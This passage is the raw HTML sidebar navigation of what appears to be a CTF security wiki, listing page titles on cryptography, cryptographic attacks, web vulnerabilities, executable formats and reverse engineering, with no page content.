      <a href="../../../../crypto/streamcipher/prng/intro/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    Introduction
    
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../../../crypto/streamcipher/prng/csprng/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    Cryptographic Security Pseudo-random Number Generator
    
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../../../crypto/streamcipher/prng/problem/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    Challenge Examples
    
  </span>
  

      </a>
    </li>
  

              
            
          </ul>
        </nav>
      
    </li>
  

              
            
              
                
  
  
  
  
    
    
    
    
      
      
    
    
    <li class="md-nav__item md-nav__item--nested">
      
        
        
        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_3_4_3" >
        
          
          <label class="md-nav__link" for="__nav_3_4_3" id="__nav_3_4_3_label" tabindex="0">
            
  
  
  <span class="md-ellipsis">
    Linear Congruence Generator
    
  </span>
  

            <span class="md-nav__icon md-icon"></span>
          </label>
        
        <nav class="md-nav" data-md-level="3" aria-labelledby="__nav_3_4_3_label" aria-expanded="false">
          <label class="md-nav__title" for="__nav_3_4_3">
            <span class="md-nav__icon md-icon"></span>
            Linear Congruence Generator
          </label>
          <ul class="md-nav__list" data-md-scrollfix>
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../../../crypto/streamcipher/lcg/intro/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    Introduction
    
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../../../crypto/streamcipher/lcg/challenge/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    Example
    
  </span>
  

      </a>
    </li>
  

              
            
          </ul>
        </nav>
      
    </li>
  

              
            
              
                
  
  
  
  
    
    
    
    
      
      
    
    
    <li class="md-nav__item md-nav__item--nested">
      
        
        
        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_3_4_4" >
        
          
          <label class="md-nav__link" for="__nav_3_4_4" id="__nav_3_4_4_label" tabindex="0">
            
  
  
  <span class="md-ellipsis">
    Feedback Shift Register
    
  </span>
  

            <span class="md-nav__icon md-icon"></span>
          </label>
        
        <nav class="md-nav" data-md-level="3" aria-labelledby="__nav_3_4_4_label" aria-expanded="false">
          <label class="md-nav__title" for="__nav_3_4_4">
            <span class="md-nav__icon md-icon"></span>
            Feedback Shift Register
          </label>
          <ul class="md-nav__list" data-md-scrollfix>
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../../../crypto/streamcipher/fsr/intro/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    Introduction
    
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../../../crypto/streamcipher/fsr/lfsr/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    Linear Feedback Shift Register
    
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../../../crypto/streamcipher/fsr/nfsr/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    Nonlinear Feedback Shift Register
    
  </span>
  

      </a>
    </li>
  

              
            
          </ul>
        </nav>
      
    </li>
  

              
            
              
                
  
  
  
  
    
    
    
    
      
      
    
    
    <li class="md-nav__item md-nav__item--nested">
      
        
        
        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_3_4_5" >
        
          
          <label class="md-nav__link" for="__nav_3_4_5" id="__nav_3_4_5_label" tabindex="0">
            
  
  
  <span class="md-ellipsis">
    Special Stream Cipher
    
  </span>
  

            <span class="md-nav__icon md-icon"></span>
          </label>
        
        <nav class="md-nav" data-md-level="3" aria-labelledby="__nav_3_4_5_label" aria-expanded="false">
          <label class="md-nav__title" for="__nav_3_4_5">
            <span class="md-nav__icon md-icon"></span>
            Special Stream Cipher
          </label>
          <ul class="md-nav__list" data-md-scrollfix>
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../../../crypto/streamcipher/special/rc4/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    RC4
    
  </span>
  

      </a>
    </li>
  

              
            
          </ul>
        </nav>
      
    </li>
  

              
            
          </ul>
        </nav>
      
    </li>
  

              
            
              
                
  
  
  
  
    
    
    
    
      
      
    
    
    <li class="md-nav__item md-nav__item--nested">
      
        
        
        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_3_5" >
        
          
          <label class="md-nav__link" for="__nav_3_5" id="__nav_3_5_label" tabindex="0">
            
  
  
  <span class="md-ellipsis">
    Block Cipher
    
  </span>
  

            <span class="md-nav__icon md-icon"></span>
          </label>
        
        <nav class="md-nav" data-md-level="2" aria-labelledby="__nav_3_5_label" aria-expanded="false">
          <label class="md-nav__title" for="__nav_3_5">
            <span class="md-nav__icon md-icon"></span>
            Block Cipher
          </label>
          <ul class="md-nav__list" data-md-scrollfix>
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../../../crypto/blockcipher/introduction/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    Introduction to Block Cipher
    
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../../../crypto/blockcipher/arx-operations/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    ARX
    
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../../../crypto/blockcipher/des/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    DES
    
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../../../crypto/blockcipher/idea/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    IDEA
    
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../../../crypto/blockcipher/aes.md" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    AES
    
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../../../crypto/blockcipher/simon-speck/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    Simon and Speck
    
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    
    
    
    
      
      
    
    
    <li class="md-nav__item md-nav__item--nested">
      
        
        
        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_3_5_7" >
        
          
          <label class="md-nav__link" for="__nav_3_5_7" id="__nav_3_5_7_label" tabindex="0">
            
  
  
  <span class="md-ellipsis">
    Group Mode
    
  </span>
  

            <span class="md-nav__icon md-icon"></span>
          </label>
        
        <nav class="md-nav" data-md-level="3" aria-labelledby="__nav_3_5_7_label" aria-expanded="false">
          <label class="md-nav__title" for="__nav_3_5_7">
            <span class="md-nav__icon md-icon"></span>
            Group Mode
          </label>
          <ul class="md-nav__list" data-md-scrollfix>
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../../../crypto/blockcipher/mode/introduction/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    Introduction
    
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../../../crypto/blockcipher/mode/padding/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    Padding Methods
    
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../../../crypto/blockcipher/mode/ecb/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    ECB
    
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../../../crypto/blockcipher/mode/cbc/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    CBC
    
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../../../crypto/blockcipher/mode/pcbc/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    PCBC
    
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../../../crypto/blockcipher/mode/cfb/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    CFB
    
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../../../crypto/blockcipher/mode/ofb/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    OFB
    
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../../../crypto/blockcipher/mode/ctr/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    CTR
    
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../../../crypto/blockcipher/mode/padding-oracle-attack/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    Padding Oracle Attack
    
  </span>
  

      </a>
    </li>
  

              
            
          </ul>
        </nav>
      
    </li>
  

              
            
          </ul>
        </nav>
      
    </li>
  

              
            
              
                
  
  
  
  
    
    
    
    
      
      
    
    
    <li class="md-nav__item md-nav__item--nested">
      
        
        
        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_3_6" >
        
          
          <label class="md-nav__link" for="__nav_3_6" id="__nav_3_6_label" tabindex="0">
            
  
  
  <span class="md-ellipsis">
    Asymmetric Cryptography
    
  </span>
  

            <span class="md-nav__icon md-icon"></span>
          </label>
        
        <nav class="md-nav" data-md-level="2" aria-labelledby="__nav_3_6_label" aria-expanded="false">
          <label class="md-nav__title" for="__nav_3_6">
            <span class="md-nav__icon md-icon"></span>
            Asymmetric Cryptography
          </label>
          <ul class="md-nav__list" data-md-scrollfix>
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../../../crypto/asymmetric/introduction/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    Introduction to Asymmetric Cryptography
    
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    
    
    
    
      
      
    
    
    <li class="md-nav__item md-nav__item--nested">
      
        
        
        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_3_6_2" >
        
          
          <label class="md-nav__link" for="__nav_3_6_2" id="__nav_3_6_2_label" tabindex="0">
            
  
  
  <span class="md-ellipsis">
    RSA
    
  </span>
  

            <span class="md-nav__icon md-icon"></span>
          </label>
        
        <nav class="md-nav" data-md-level="3" aria-labelledby="__nav_3_6_2_label" aria-expanded="false">
          <label class="md-nav__title" for="__nav_3_6_2">
            <span class="md-nav__icon md-icon"></span>
            RSA
          </label>
          <ul class="md-nav__list" data-md-scrollfix>
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../../../crypto/asymmetric/rsa/rsa_theory/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    RSA Introduction
    
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../../../crypto/asymmetric/rsa/rsa_module_attack/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    Modulo-related Attacks
    
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../../../crypto/asymmetric/rsa/rsa_e_attack/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    Public Key Index Related Attacks
    
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../../../crypto/asymmetric/rsa/rsa_d_attack/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    Private Key d Related Attacks
    
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../../../crypto/asymmetric/rsa/rsa_coppersmith_attack.md" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    Coppersmith Related Attacks
    
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../../../crypto/asymmetric/rsa/rsa_chosen_plain_cipher/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    Chosen Plain Cipher Attack
    
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../../../crypto/asymmetric/rsa/rsa_side_channel/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    Side Channel Attack
    
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../../../crypto/asymmetric/rsa/rsa_pkcs_attack/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    Bleichenbacher Attack
    
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../../../crypto/asymmetric/rsa/rsa_complex/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    Challenge Examples
    
  </span>
  

      </a>
    </li>
  

              
            
          </ul>
        </nav>
      
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../../../crypto/asymmetric/knapsack/knapsack/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    Knapsack Cipher
    
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    
    
    
    
      
      
    
    
    <li class="md-nav__item md-nav__item--nested">
      
        
        
        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_3_6_4" >
        
          
          <label class="md-nav__link" for="__nav_3_6_4" id="__nav_3_6_4_label" tabindex="0">
            
  
  
  <span class="md-ellipsis">
    Discrete Log Correlation
    
  </span>
  

            <span class="md-nav__icon md-icon"></span>
          </label>
        
        <nav class="md-nav" data-md-level="3" aria-labelledby="__nav_3_6_4_label" aria-expanded="false">
          <label class="md-nav__title" for="__nav_3_6_4">
            <span class="md-nav__icon md-icon"></span>
            Discrete Log Correlation
          </label>
          <ul class="md-nav__list" data-md-scrollfix>
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../../../crypto/asymmetric/discrete-log/discrete-log/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    Discrete Logarithm
    
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../../../crypto/asymmetric/discrete-log/elgamal/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    Elgamal
    
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../../../crypto/asymmetric/discrete-log/ecc/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    ECC
    
  </span>
  

      </a>
    </li>
  

              
            
          </ul>
        </nav>
      
    </li>
  

              
            
              
                
  
  
  
  
    
    
    
    
      
      
    
    
    <li class="md-nav__item md-nav__item--nested">
      
        
        
        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_3_6_5" >
        
          
          <label class="md-nav__link" for="__nav_3_6_5" id="__nav_3_6_5_label" tabindex="0">
            
  
  
  <span class="md-ellipsis">
    Lattice-based Cryptography
    
  </span>
  

            <span class="md-nav__icon md-icon"></span>
          </label>
        
        <nav class="md-nav" data-md-level="3" aria-labelledby="__nav_3_6_5_label" aria-expanded="false">
          <label class="md-nav__title" for="__nav_3_6_5">
            <span class="md-nav__icon md-icon"></span>
            Lattice-based Cryptography
          </label>
          <ul class="md-nav__list" data-md-scrollfix>
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../../../crypto/asymmetric/lattice/overview/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    Lattice Overview
    
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../../../crypto/asymmetric/lattice/introduction/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    Introduction to Lattices
    
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../../../crypto/asymmetric/lattice/lattice-reduction/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    Lattice-based Algorithm
    
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../../../crypto/asymmetric/lattice/cvp/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    CVP
    
  </span>
  

      </a>
    </li>
  

              
            
          </ul>
        </nav>
      
    </li>
  

              
            
          </ul>
        </nav>
      
    </li>
  

              
            
              
                
  
  
  
  
    
    
    
    
      
      
    
    
    <li class="md-nav__item md-nav__item--nested">
      
        
        
        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_3_7" >
        
          
          <label class="md-nav__link" for="__nav_3_7" id="__nav_3_7_label" tabindex="0">
            
  
  
  <span class="md-ellipsis">
    Hash Function
    
  </span>
  

            <span class="md-nav__icon md-icon"></span>
          </label>
        
        <nav class="md-nav" data-md-level="2" aria-labelledby="__nav_3_7_label" aria-expanded="false">
          <label class="md-nav__title" for="__nav_3_7">
            <span class="md-nav__icon md-icon"></span>
            Hash Function
          </label>
          <ul class="md-nav__list" data-md-scrollfix>
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../../../crypto/hash/introduction/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    Introduction to the Hash Function
    
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../../../crypto/hash/md5/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    MD5
    
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../../../crypto/hash/sha1/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    SHA1
    
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../../../crypto/hash/fnv/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    FNV
    
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../../../crypto/hash/attack/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    Hash Attack
    
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../../../crypto/hash/complex/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    Challenge Examples
    
  </span>
  

      </a>
    </li>
  

              
            
          </ul>
        </nav>
      
    </li>
  

              
            
              
                
  
  
  
  
    
    
    
    
      
      
    
    
    <li class="md-nav__item md-nav__item--nested">
      
        
        
        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_3_8" >
        
          
          <label class="md-nav__link" for="__nav_3_8" id="__nav_3_8_label" tabindex="0">
            
  
  
  <span class="md-ellipsis">
    Digital Signature
    
  </span>
  

            <span class="md-nav__icon md-icon"></span>
          </label>
        
        <nav class="md-nav" data-md-level="2" aria-labelledby="__nav_3_8_label" aria-expanded="false">
          <label class="md-nav__title" for="__nav_3_8">
            <span class="md-nav__icon md-icon"></span>
            Digital Signature
          </label>
          <ul class="md-nav__list" data-md-scrollfix>
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../../../crypto/signature/introduction/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    Introduction to Digital Signatures
    
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../../../crypto/signature/rsa/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    RSA Digital Signature
    
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../../../crypto/signature/elgamal.md" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    ElGamal Digital Signature
    
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../../../crypto/signature/dsa/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    DSA Digital Signature
    
  </span>
  

      </a>
    </li>
  

              
            
          </ul>
        </nav>
      
    </li>
  

              
            
              
                
  
  
  
  
    
    
    
    
      
      
    
    
    <li class="md-nav__item md-nav__item--nested">
      
        
        
        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_3_9" >
        
          
          <label class="md-nav__link" for="__nav_3_9" id="__nav_3_9_label" tabindex="0">
            
  
  
  <span class="md-ellipsis">
    Summary of Attack Techniques
    
  </span>
  

            <span class="md-nav__icon md-icon"></span>
          </label>
        
        <nav class="md-nav" data-md-level="2" aria-labelledby="__nav_3_9_label" aria-expanded="false">
          <label class="md-nav__title" for="__nav_3_9">
            <span class="md-nav__icon md-icon"></span>
            Summary of Attack Techniques
          </label>
          <ul class="md-nav__list" data-md-scrollfix>
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../../../crypto/attack-summary/attack-mode/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    Introduction
    
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../../../crypto/attack-summary/meet-in-the-middle/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    Man in the Middle Attack
    
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../../../crypto/attack-summary/bit-attack/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    Bit attack
    
  </span>
  

      </a>
    </li>
  

              
            
          </ul>
        </nav>
      
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../../../crypto/certificate/introduction/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    Certificate Format
    
  </span>
  

      </a>
    </li>
  

              
            
          </ul>
        </nav>
      
    </li>
  

    
      
      
  
  
  
  
    
    
    
    
      
      
    
    
    <li class="md-nav__item md-nav__item--nested">
      
        
        
        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_4" >
        
          
          <label class="md-nav__link" for="__nav_4" id="__nav_4_label" tabindex="0">
            
  
  
  <span class="md-ellipsis">
    Web
    
  </span>
  

            <span class="md-nav__icon md-icon"></span>
          </label>
        
        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_4_label" aria-expanded="false">
          <label class="md-nav__title" for="__nav_4">
            <span class="md-nav__icon md-icon"></span>
            Web
          </label>
          <ul class="md-nav__list" data-md-scrollfix>
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../../../web/introduction/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    Introduction to Web Applications
    
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../../../web/sqli/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    SQL Injection
    
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../../../web/xss.md" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    XSS Cross-Site Scripting
    
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../../../web/csrf/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    CSRF Cross-Site Request Forgery
    
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../../../web/ssrf/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    SSRF Server Request Forgery
    
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../../../web/php/php/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    PHP Code Auditing
    
  </span>
  

      </a>
    </li>
  

              
            
          </ul>
        </nav>
      
    </li>
  

    
      
      
  
  
  
  
    
    
    
    
      
      
    
    
    <li class="md-nav__item md-nav__item--nested">
      
        
        
        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_5" >
        
          
          <label class="md-nav__link" for="__nav_5" id="__nav_5_label" tabindex="0">
            
  
  
  <span class="md-ellipsis">
    Assembly
    
  </span>
  

            <span class="md-nav__icon md-icon"></span>
          </label>
        
        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_5_label" aria-expanded="false">
          <label class="md-nav__title" for="__nav_5">
            <span class="md-nav__icon md-icon"></span>
            Assembly
          </label>
          <ul class="md-nav__list" data-md-scrollfix>
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../../../assembly/x86-x64/readme/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    x86_x64
    
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../../../assembly/mips/readme/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    mips
    
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../../../assembly/arm/readme/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    arm
    
  </span>
  

      </a>
    </li>
  

              
            
          </ul>
        </nav>
      
    </li>
  

    
      
      
  
  
  
  
    
    
    
    
      
      
    
    
    <li class="md-nav__item md-nav__item--nested">
      
        
        
        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_6" >
        
          
          <label class="md-nav__link" for="__nav_6" id="__nav_6_label" tabindex="0">
            
  
  
  <span class="md-ellipsis">
    Executable
    
  </span>
  

            <span class="md-nav__icon md-icon"></span>
          </label>
        
        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_6_label" aria-expanded="false">
          <label class="md-nav__title" for="__nav_6">
            <span class="md-nav__icon md-icon"></span>
            Executable
          </label>
          <ul class="md-nav__list" data-md-scrollfix>
            
              
                
  
  
  
  
    
    
    
    
      
      
    
    
    <li class="md-nav__item md-nav__item--nested">
      
        
        
        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_6_1" >
        
          
          <label class="md-nav__link" for="__nav_6_1" id="__nav_6_1_label" tabindex="0">
            
  
  
  <span class="md-ellipsis">
    ELF file
    
  </span>
  

            <span class="md-nav__icon md-icon"></span>
          </label>
        
        <nav class="md-nav" data-md-level="2" aria-labelledby="__nav_6_1_label" aria-expanded="false">
          <label class="md-nav__title" for="__nav_6_1">
            <span class="md-nav__icon md-icon"></span>
            ELF file
          </label>
          <ul class="md-nav__list" data-md-scrollfix>
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../../../executable/elf/elf-structure.md" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    ELF File Basic Structure
    
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../../../executable/elf/program-loading/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    Program Loading
    
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../../../executable/elf/program-linking/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    Program Link
    
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../../../executable/elf/running-overview/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    Program Execution Flow
    
  </span>
  

      </a>
    </li>
  

              
            
          </ul>
        </nav>
      
    </li>
  

              
            
              
                
  
  
  
  
    
    
    
    
      
      
    
    
    <li class="md-nav__item md-nav__item--nested">
      
        
        
        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_6_2" >
        
          
          <label class="md-nav__link" for="__nav_6_2" id="__nav_6_2_label" tabindex="0">
            
  
  
  <span class="md-ellipsis">
    PE file
    
  </span>
  

            <span class="md-nav__icon md-icon"></span>
          </label>
        
        <nav class="md-nav" data-md-level="2" aria-labelledby="__nav_6_2_label" aria-expanded="false">
          <label class="md-nav__title" for="__nav_6_2">
            <span class="md-nav__icon md-icon"></span>
            PE file
          </label>
          <ul class="md-nav__list" data-md-scrollfix>
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../../../executable/pe/pe-excutable.md" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    PE File Basic Structure
    
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../../../executable/pe/pe-import-table.md" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    PE Import Table
    
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../../../executable/pe/pe-export-table.md" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    PE Export Table
    
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../../../executable/pe/pe-relocation-table.md" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    PE Relocation Table
    
  </span>
  

      </a>
    </li>
  

              
            
          </ul>
        </nav>
      
    </li>
  

              
            
          </ul>
        </nav>
      
    </li>
  

    
      
      
  
  
  
  
    
    
    
    
      
      
    
    
    <li class="md-nav__item md-nav__item--nested">
      
        
        
        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_7" >
        
          
          <label class="md-nav__link" for="__nav_7" id="__nav_7_label" tabindex="0">
            
  
  
  <span class="md-ellipsis">
    Reverse Engineering
    
  </span>
  

            <span class="md-nav__icon md-icon"></span>
          </label>
        
        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_7_label" aria-expanded="false">
          <label class="md-nav__title" for="__nav_7">
            <span class="md-nav__icon md-icon"></span>
            Reverse Engineering
          </label>
          <ul class="md-nav__list" data-md-scrollfix>
            
              
                
  
  
  
  
    
    
    
    
      
      
    
    
    <li class="md-nav__item md-nav__item--nested">
      
        
        
